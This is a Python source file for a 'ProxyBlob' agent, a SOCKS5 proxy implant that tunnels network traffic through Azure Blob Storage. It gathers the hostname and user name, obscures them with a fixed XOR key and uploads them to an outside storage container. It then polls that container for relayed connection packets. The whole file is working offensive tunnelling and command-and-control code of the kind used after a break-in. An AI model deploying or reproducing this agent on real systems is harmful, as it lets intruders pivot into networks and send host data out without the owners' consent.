import argparse, base64, getpass, requests, datetime, socket, sys, urllib.request
import threading
import time
import importlib

# Force reload modules to ensure latest code
if 'protocol' in sys.modules:
    importlib.reload(sys.modules['protocol'])
if 'azsocks' in sys.modules:
    importlib.reload(sys.modules['azsocks'])

import protocol
import azsocks
from urllib.parse import urlparse

Success = 0
ErrContextCanceled = 1
ErrNoConnectionString = 2
ErrConnectionStringError = 3
ErrInfoBlobError = 4
ErrContainerNotFound = 5

def ParseConnectionString(ConnString):
    decoded = base64.b64decode(ConnString + "==", validate=False)
    u = urlparse(decoded.decode())
    path = u.path.lstrip("/")
    storage_url = f"{u.scheme}://{u.netloc}"
    return storage_url, path, u.query, Success

def XorRoutine(data: bytes) -> bytes:
    if not isinstance(data, (bytes, bytearray)):
        raise TypeError("data must be bytes")
    key = (0xDE, 0xAD, 0xB1, 0x0B)
    final = bytearray()
    ki = 0
    for b in data:
        final.append(b ^ key[ki])
        ki += 1
        if ki >= len(key):
            ki = 0
    return bytes(final)

def GetCurrentInfo():
    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "unknown"
    try:
        currentUser = getpass.getuser()
    except Exception:
        currentUser = "unknown"
    hostInfo = f"{hostname}\\{currentUser}@{hostname}"
    return XorRoutine(hostInfo.encode())

def InfoData(storageURL, containerID, sasToken, hostInfo: bytes):
    req = urllib.request.Request(
        storageURL + "/" + containerID + "/info?" + sasToken,
        data=hostInfo,
        method="PUT"
    )
    req.add_header("x-ms-blob-type", "BlockBlob")
    req.add_header("Content-Type", "application/octet-stream")
    req.add_header("Content-Length", str(len(hostInfo)))
    req.add_header("x-ms-date", datetime.datetime.now(datetime.timezone.utc).isoformat())
    req.add_header("x-ms-version", "2020-04-08")
    
    with urllib.request.urlopen(req) as resp:
        if resp.status not in (200, 201):
            raise RuntimeError(f"unexpected status: {resp.status}")

class BlobTransport:
    """Transport implementation using Azure Blob Storage"""
    
    def __init__(self, storage_url, container_id, sas_token):
        self.storage_url = storage_url
        self.container_id = container_id
        self.sas_token = sas_token
        self.running = True
    
    def send(self, data: bytes) -> int:
        """Send data through blob storage"""
        if not self.running:
            return protocol.ErrTransportClosed
        
        try:
            req = urllib.request.Request(
                f"{self.storage_url}/{self.container_id}/response?{self.sas_token}",
                data=data,
                method="PUT"
            )
            req.add_header("x-ms-blob-type", "BlockBlob")
            req.add_header("Content-Type", "application/octet-stream")
            req.add_header("Content-Length", str(len(data)))
            req.add_header("x-ms-date", datetime.datetime.now(datetime.timezone.utc).isoformat())
            req.add_header("x-ms-version", "2020-04-08")
            
            with urllib.request.urlopen(req, timeout=10) as resp:
                if resp.status not in (200, 201):
                    return protocol.ErrTransportError
            
            return protocol.ErrNone
        
        except urllib.error.URLError:
            return protocol.ErrTransportError
        except Exception:
            return protocol.ErrTransportError
    
    def receive(self) -> tuple:
        """Receive data from blob storage and clear it after successful read"""
        if not self.running:
            return None, protocol.ErrTransportClosed
        
        try:
            # Get data from blob
            response = requests.get(
                f"{self.storage_url}/{self.container_id}/request?{self.sas_token}",
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.content
                
                # Clear the blob after successful receive
                if len(data) > 0:
                    try:
                        clear_response = requests.put(
                            f"{self.storage_url}/{self.container_id}/request?{self.sas_token}",
                            data=b'',
                            headers={
                                'x-ms-blob-type': 'BlockBlob',
                                'Content-Type': 'application/octet-stream',
                                'Content-Length': '0',
                                'x-ms-date': datetime.datetime.now(datetime.timezone.utc).isoformat(),
                                'x-ms-version': '2020-04-08'
                            },
                            timeout=5
                        )
                        
                        if clear_response.status_code not in (200, 201):
                            print(f"[!] Warning: Failed to clear blob (status {clear_response.status_code})")
                            
                    except Exception as clear_err:
                        print(f"[!] Warning: Failed to clear blob: {clear_err}")
                
                return data, protocol.ErrNone
                
            elif response.status_code == 404:
                return b'', protocol.ErrNone
            else:
                return None, protocol.ErrTransportError
                
        except requests.Timeout:
            return None, protocol.ErrTransportTimeout
        except Exception as e:
            print(f"[-] Receive error: {e}")
            return None, protocol.ErrTransportError
        
    def close(self) -> int:
        """Close the transport"""
        self.running = False
        return protocol.ErrNone

def VerifyProtocol():
    """Verify protocol module has required methods"""
    print("[*] Verifying protocol module...")
    
    required_methods = ['get_connection', 'create_connection', 'delete_connection', 
                       'send_ack', 'send_data', 'send_close']
    
    missing = []
    for method in required_methods:
        if not hasattr(protocol.BaseHandler, method):
            missing.append(method)
    
    if missing:
        print(f"[-] ERROR: BaseHandler is missing methods: {missing}")
        available = [m for m in dir(protocol.BaseHandler) if not m.startswith('_')]
        print(f"[-] Available methods: {available}")
        return False
    
    print(f"[+] BaseHandler has all required methods")
    return True

def NewAgent(ConnString):
    """Initialize agent with SOCKS5 handler"""
    
    # Verify protocol first
    if not VerifyProtocol():
        return ErrContextCanceled
    
    # Parse connection string
    storageURL, containerID, sasToken, errCode = ParseConnectionString(ConnString)
    if errCode != Success:
        return ErrConnectionStringError
    
    print(f"[*] Connecting to: {storageURL}")
    print(f"[*] Container ID: {containerID}")
    
    # Send host information
    try:
        InfoData(storageURL, containerID, sasToken, GetCurrentInfo())
        print("[+] Host information sent successfully")
    except Exception as e:
        print(f"[-] Failed to send host info: {e}")
        return ErrInfoBlobError
    
    # Create blob transport
    blob_transport = BlobTransport(storageURL, containerID, sasToken)
    
    # Create base handler
    base_handler = protocol.BaseHandler(blob_transport)
    
    # Create SOCKS5 handler
    socks_handler = azsocks.SocksHandler(base_handler)
    
    print("[+] SOCKS5 handler initialized")
    print("[*] Starting receive loop...")
    
    # Start the receive loop
    try:
        base_handler.receive_loop()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        blob_transport.close()
    except Exception as e:
        print(f"[-] Error in receive loop: {e}")
        import traceback
        traceback.print_exc()
        return ErrContextCanceled
    
    return Success

def TestPacketProcessing(ConnString):
    """Test function to manually process packets"""
    
    # Verify protocol first
    if not VerifyProtocol():
        return ErrContextCanceled
    
    storageURL, containerID, sasToken, errCode = ParseConnectionString(ConnString)
    if errCode != Success:
        return ErrConnectionStringError
    
    # Send info
    InfoData(storageURL, containerID, sasToken, GetCurrentInfo())
    
    # Create blob transport
    blob_transport = BlobTransport(storageURL, containerID, sasToken)
    base_handler = protocol.BaseHandler(blob_transport)
    socks_handler = azsocks.SocksHandler(base_handler)
    
    print("[*] Waiting for packets...")
    
    # Manual receive loop for testing
    consecutive_errors = 0
    max_consecutive_errors = 5
    
    while consecutive_errors < max_consecutive_errors:
        # Receive data
        data, err_code = blob_transport.receive()
        
        if err_code != protocol.ErrNone:
            consecutive_errors += 1
            if err_code == protocol.ErrTransportError:
                time.sleep(consecutive_errors * 0.05)
            continue
        
        consecutive_errors = 0
        
        if not data or len(data) == 0:
            time.sleep(0.1)
            continue
        
        # Decode packet
        packet = protocol.Packet.decode(data)
        if not packet:
            print("[-] Failed to decode packet")
            continue
        
        print(f"[+] Received packet: Command={packet.command}, ConnID={packet.connection_id.hex()}")
        
        # Process packet based on command
        try:
            if packet.command == protocol.CmdNew:
                print(f"[*] New connection request")
                err_code = socks_handler.on_new(packet.connection_id, packet.data)
                print(f"[*] OnNew result: {err_code}")
                
            elif packet.command == protocol.CmdAck:
                print(f"[*] Connection acknowledgment")
                err_code = socks_handler.on_ack(packet.connection_id, packet.data)
                print(f"[*] OnAck result: {err_code}")
                
            elif packet.command == protocol.CmdData:
                print(f"[*] Data packet ({len(packet.data)} bytes)")
                err_code = socks_handler.on_data(packet.connection_id, packet.data)
                print(f"[*] OnData result: {err_code}")
                
            elif packet.command == protocol.CmdClose:
                print(f"[*] Close connection")
                reason = packet.data[0] if packet.data else 0
                err_code = socks_handler.on_close(packet.connection_id, reason)
                print(f"[*] OnClose result: {err_code}")
            
            else:
                print(f"[-] Unknown command: {packet.command}")
        
        except Exception as e:
            print(f"[-] Error processing packet: {e}")
            import traceback
            traceback.print_exc()
        
        time.sleep(0.1)
    
    print("[-] Too many consecutive errors, exiting")
    return ErrContextCanceled

def main():
    parser = argparse.ArgumentParser(description="ProxyBlob Agent - SOCKS5 Proxy over Blob Storage")
    parser.add_argument("-c", dest="ConnString", default="", help="Connection string")
    parser.add_argument("--test", action="store_true", help="Run in test mode with verbose output")
    args = parser.parse_args()
    
    if args.ConnString == "":
        parser.print_help()
        return ErrNoConnectionString
    
    ConnString = args.ConnString
    
    if args.test:
        print("[*] Running in test mode")
        return TestPacketProcessing(ConnString)
    else:
        return NewAgent(ConnString)

if __name__ == "__main__":
    sys.exit(main())